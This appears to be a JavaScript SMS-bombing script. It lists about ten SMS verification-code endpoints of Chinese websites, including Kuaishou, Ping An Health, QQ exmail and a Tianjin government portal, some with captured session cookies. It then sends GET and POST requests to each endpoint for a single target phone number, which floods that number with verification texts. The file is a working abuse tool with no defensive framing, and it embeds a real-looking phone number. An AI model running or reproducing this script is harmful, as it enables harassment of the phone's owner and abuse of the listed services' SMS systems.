let api_list = [
    {
        "url": "https://www.yojiang.cn/api/user/send_verify_code?phone=17320146770",
        "type": "GET",
        "cookie": "guest_uuid=5e3626fd9b6dde14e9293bee; _xsrf=2|a63a71a2|6bfa82e8f3ff66bbf83b67c2a67a9cf5|1580823294; Hm_lvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404; Hm_lpvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404"
    },
    {
        "url": "https://m.health.pingan.com/mapi/smsCode.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1545122608&app=0&platform=3&app_key=PAHealth&osversion=23&info=&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=m_h5&phone=17320146770",
        "type": "GET"
    },
    {
        "url": "https://www.smartstudy.com/api/user-service/captcha/phone",
        "params": {
            "type": "authenticode",
            "phone": "17320146770",
            "countryCode": "86",
        },
        "type": "POST"
    },
    {
        "url": "https://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=17320146770",
        "type": "GET",
    },
    {
        "url": "https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode",
        "type": "POST",
        "params": {
            "sid": "kuaishou.live.web",
            "type": "53",
            "countryCode": "+86",
            "phone": "17320146770"
        }
    },
    {
        "url": "http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=17320146770&mbid=197873&check=3",
        "type": "GET",
        "cookie": "PHPSESSID=q8h78o91qm30m5bl7lufkt3go3; jrh_visit_log=q8h78o91qm30m5bl7lufkt3go3; Hm_lvt_b627bb080fd97f01181b26820034cfcb=1580999339; UM_distinctid=1701ae772688ac-09ae1bde44e676-6701b35-144000-1701ae772699ca; CNZZDATA1276814029=219078261-1580999135-%7C1580999135; Hm_lpvt_b627bb080fd97f01181b26820034cfcb=1580999403"
    },
    {
        "url": "https://developer.i4.cn/put/getMsgCode.xhtml?_=1580912157461&phoneNumber=17320146770&codeType=6",
        "type": "GET"
    },
    {
        "special": "xxsy",
        "first": {
            "url": "https://www.xxsy.net/Reg",
            "type": "GET"
        },
        "url": "https://www.xxsy.net/Reg/Actions",
        "type": "POST",
        "params": {
            "method": "sms",
            "mobile": "17320146770",
            "uname": "17320146770",
            "token": "",
        },
        "headers": {
            "cookie": "ASP.NET_SessionId=1zpetajacprst1vvgvtqvt2u; pcstatpageusersign=1lzva83zoqa3qpid3ukvojnye9xgq0th; UM_distinctid=1701a43b89b44b-0e920e8853ac59-6701b35-144000-1701a43b89c9d1; CNZZDATA1275068799=1423156539-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; CNZZDATA1275068004=1203802890-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; __qc_wId=999; pgv_pvid=1596346520; xxcpoint=GU3TIZJYHE3DOZJTGAZTKOJUGJSGIOJWG5SWCMDDGA4DANJZGJRA",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            "X-Requested-With": "XMLHttpRequest"
        }
    },
    {
        "special": "ruanmei",
        "first": {
            "url": "https://my.ruanmei.com/?page=register",
            "type": "GET"
        },
        "headers": {
            "cookie": "ASP.NET_SessionId=wmw5kiwrmvxibb2zvk2qhxsh; CheckCode=MXPF; CheckCode_fp=GNGW; KLBRSID=b039105d4718660de1867d1c40076e29|1580992153|1580992141; sendsms=Thu%20Feb%2006%202020%2020%3A29%3A13%20GMT+0800%20%28%u4E2D%u56FD%u6807%u51C6%u65F6%u95F4%29",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            "Referer": "https://my.ruanmei.com/?page=register",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/json; charset=UTF-8"
        },
        "url": "https://my.ruanmei.com/Default.aspx/SendSmsReg20190319",
        "type": "POST",
        "params": {
            "mobile": "17320146770",
            "checkreg": "true",
            "validate": "",
            "data": ""
        }
    },
    {
        "url": "http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",
        "type": "POST",
        "params": {
            "MOBILENO": "17320146770",
            "TEMP": "1"
        },
        "cookie": "qcdzh-session-id=fe77ec80-efb8-4238-844e-c0e136b349de; UM_distinctid=1701adce0071-069b6727280a07-6701b35-144000-1701adce00891c; CNZZDATA1274944014=862482110-1580998603-http%253A%252F%252Fqydj.scjg.tj.gov.cn%252F%7C1580998603"
    },
]

let phone ="17320146770"
const http =require("https")
const axios =require("axios")
axios.defaults.withCredentials=true
http.get("https://www.yojiang.cn/api/user/send_verify_code?phone="+phone,res => {
    res.on("data",(data)=>{
        console.log(data.toString())
    })
   // console.log(res)
})

api_list.forEach(i=>{
    axios.get(i.url,{
        params:i.params,
        cookie:i.cookie
    }).finally(t=>{
        console.log(t)
    }).catch(e=>{
        console.log(e)
    })
    axios.post(i.url,{
        params:i.params,
        cookie:i.cookie
    }).finally(t=>{
        console.log(t)
    }).catch(e=>{
        console.log(e)
    })
})
